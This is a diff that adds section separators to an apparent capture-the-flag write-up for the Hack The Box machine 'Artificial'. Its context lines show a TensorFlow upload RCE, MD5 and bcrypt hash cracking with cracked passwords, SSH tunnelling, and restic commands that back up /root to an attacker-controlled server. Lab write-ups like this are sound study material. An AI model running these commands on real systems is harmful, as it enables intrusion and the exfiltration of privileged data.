@@ -1,5 +1,6 @@
 # 🚪 Hack The Box – Artificial (Easy)
 Machine Type: Linux | Solved by: Akshat Nigam | Category:Web Exploitation, Docker Misconfiguration, Privilege Escalation | Difficulty: Easy | Attack Surface:HTTP (port 80), TensorFlow via file upload
+---
 ## Initial Enumeration
 
 ### Nmap Scan
@@ -12,7 +13,7 @@ nmap -sV -sC 10.10.11.74 -v
 
 * 22/tcp: OpenSSH 8.2p1
 * 80/tcp: HTTP (nginx 1.18.0)
-
+---
 ## Web Exploitation - TensorFlow RCE
 
 1. Register a user and access the upload page.
@@ -41,7 +42,7 @@ Start the container
 ```bash
 docker run -it -v $(pwd):/app <image name> 
 ```
-
+---
 ### Exploit Code
 
 ```python
@@ -60,7 +61,7 @@ model.save("exploit.h5")
 ```
 
 3. Upload model and trigger execution by clicking **"View Predictions"**.
-
+---
 ## Getting User
 
 ### SQL Enumeration
@@ -75,7 +76,7 @@ Extracted user hashes. Example:
 ```plaintext
 1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
 ```
-
+---
 ### Cracking Hash with John
 
 ```bash
@@ -83,13 +84,13 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
 ```
 
 Cracked Password: `mattp005numbertwo`
-
+---
 ### SSH Access
 
 ```bash
 ssh gael@10.10.11.74
 ```
-
+---
 ## Privilege Escalation - Root
 
 ### Backup Discovery
@@ -102,7 +103,7 @@ ls -la
 Found: `backrest_backup.tar.gz`
 
 Extracted and found:
-
+---
 ## Netcat Transfer 
 
 ```bash
@@ -122,7 +123,7 @@ cat .config/backrest/config.json
 ```json
 "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
 ```
-
+---
 ### Decode and Crack Bcrypt
 
 ```bash
@@ -137,14 +138,14 @@ Cracked Password: `!@#$%^`
 ```bash
 ssh gael@10.10.11.74 -L 9898:127.0.0.1:9898
 ```
-
+---
 ## Using Restic (GTFOBins)
 Go to the http://localhost:9898 enter the username and password you gained above. 
 ```bash
 Username: backrest_root
 Password: !@#$%^
 ```
-
+---
 ### Start Local Restic Server
 
 Create your own Repo name it according to your use. 
@@ -167,7 +168,7 @@ Now after creating the repo, in the Run command execute:
 restic -r rest:http://<your-ip>:12345/myrepo init
 restic -r rest:http://<your-ip>:12345/myrepo backup /root
 ```
-
+---
 ### On Attacker - Restore Snapshot
 
 ```bash
@@ -180,7 +181,7 @@ Root flag found:
 ```bash
 cat restore/root/root.txt
 ```
-
+---
 ### SSH as Root (Optional)
 
 ```bash
